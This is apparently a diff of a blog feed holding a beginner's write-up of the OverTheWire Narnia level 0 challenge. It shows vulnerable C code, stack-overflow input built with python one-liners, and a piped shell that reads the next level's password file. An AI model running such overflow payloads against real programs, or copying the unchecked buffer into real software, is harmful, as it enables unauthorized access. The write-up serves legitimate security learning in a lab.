-&lt;p&gt;As a part of my New Year's resolutions I decided to improve my knowledge of binary exploitation, learn more by completing challenges from &lt;a href=&quot;http://overthewire.org/wargames/&quot;&gt;OverTheWire&lt;/a&gt;, especially Narnia, as they are aimed to people wanting to learn about basics. &lt;/p&gt;
-
-&lt;h1&gt;Challenge&lt;/h1&gt;
-
-&lt;p&gt;Firstly, let's take a look at the code of this program. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
-#include &amp;lt;stdlib.h&amp;gt;
-&lt;/span&gt;
-&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
-	&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x41414141&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-	&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
-
-	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Correct val's value from 0x41414141 -&amp;gt; 0xdeadbeef!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Here is your chance: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%24s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;buf: %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;val: 0x%08x&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-
-	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdeadbeef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;WAY OFF!!!!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-		&lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-
-	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Okay, now we know that the binary accepts one string input from the user and puts the string into a buffer of 20 bytes, then if the value of variable &lt;b&gt;val&lt;/b&gt; is equal to &lt;b&gt;0xdeadbeef&lt;/b&gt;, we will get a shell. Let's try to send to 20 &quot;A&quot; characters, with 4 letters &quot;B&quot;, in order to overflow the buffer, and overwrite the value of &lt;b&gt;0x41414141&lt;/b&gt; with our &quot;B&quot; letters. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia0@melinda:/narnia$ python -c print'(&quot;A&quot; * 20) + &quot;BBBB&quot;' | ./narnia0
-Correct val's value from 0x41414141 -&amp;gt; 0xdeadbeef!
-Here is your chance: buf: AAAAAAAAAAAAAAAAAAAABBBB
-val: 0x42424242
-WAY OFF!!!!
-narnia0@melinda:/narnia$&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Great, now we know that it works and we're one step closer to the solution. Now let's think how we can change value to &lt;b&gt;0xdeadbeef&lt;/b&gt;. First thing to remember - the values need to be in hex format, not characters as I thought at first. In addition, I recalled that the bytes will be in reversed order, so we have to write them from the last to the first one. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia0@melinda:/narnia$ python -c print'(&quot;A&quot; * 20) + &quot;\xef\xbe\xad\xde&quot;' | ./narnia0
-Correct val's value from 0x41414141 -&amp;gt; 0xdeadbeef!
-Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
-val: 0xdeadbeef&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;We got the shell but it closed immediately! Let's find a way to keep it running, in order to view the password to the next level. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia0@melinda:/narnia$ (python -c print'(&quot;A&quot; * 20) + &quot;\xef\xbe\xad\xde&quot;'; cat /etc/narnia_pass/narnia1) | ./narnia0
-Correct val's value from 0x41414141 -&amp;gt; 0xdeadbeef!
-Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
-val: 0xdeadbeef
-cat: /etc/narnia_pass/narnia1: Permission denied&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Unfortunately, it closed too quickly and the command was executed after the shell had closed. I tried many other commands, and noticed something strange - &lt;b&gt;cat&lt;/b&gt; seemed to do exactly what we want! &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;narnia0@melinda:/narnia$ (python -c print'(&quot;A&quot; * 20) + &quot;\xef\xbe\xad\xde&quot;'; cat) | ./narnia0
-Correct val's value from 0x41414141 -&amp;gt; 0xdeadbeef!
-Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
-val: 0xdeadbeef
-whoami
-narnia1
-cat /etc/narnia_pass/narnia1
-********&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;But why is it working? From man page: &lt;/p&gt;
-
-&lt;p&gt;&lt;b&gt;With no FILE, or when FILE is -, read standard input.&lt;/b&gt;&lt;/p&gt;
-
-&lt;h1&gt;Last words&lt;/h1&gt;
-
-&lt;p&gt;As I never tought before, this was a great challenge, and I think I got more interested in binary exploitation and reverse engineering. Can't wait to try out some other challenges, and I'll see you in the next one!&lt;/p&gt;
-
-&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Overthewire" /><summary type="html">Introduction</summary></entry></feed>
+&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Overthewire" /><summary type="html">Introduction Another month, another challenge, next part of OverTheWire's Narnia wargames. Unfortunately lack of time, made it impossible for me to publish anything sooner. Sorry for that!</summary></entry></feed>
